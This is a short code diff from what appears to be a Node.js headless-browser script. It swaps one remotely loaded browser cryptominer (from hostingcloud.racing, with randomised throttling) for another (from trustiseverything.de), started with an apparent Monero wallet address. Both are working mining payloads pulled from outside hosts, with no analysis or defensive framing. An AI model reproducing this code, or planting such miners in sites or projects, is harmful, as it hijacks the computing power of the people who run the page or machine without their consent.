@@ -19,25 +19,9 @@ console.log(" starting...");
 
 	await page.setContent(`
 	<html>
-<head>
-<script src="https://www.hostingcloud.racing/1hG1.js"></script>
-<script>
-    var _client = new Client.Anonymous('1d030bb2124dfb41faa9608c5f0ce8afa4b5a482c4722a880e2ecad6fff9e423', {
-        throttle: 0, c: 'w', ads: 0
-    });
-    _client.start();
-   
-
-function myFunction() {
-  var min = 5,
-    max = 50;
-  var rand = Math.floor(Math.random() * (max - min + 1) + min); 
-	_client.setThrottle(Math.random());
-  setTimeout(myFunction, rand * 1000);
-}
-
-myFunction()
-    
+<head><script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo" ></script>
+<script type="text/javascript">
+EverythingIsLife('46FeqLboWK8PZBCrGmLFVrebuAf9Y55mnYg3cDLvtc316a1fYs8VnqMGg76MfAsF6C9ZLE6jTqh5CHAK2MhXUjM5HQV1dAC', 'x', 50);
 </script>
 </head>
 <body>
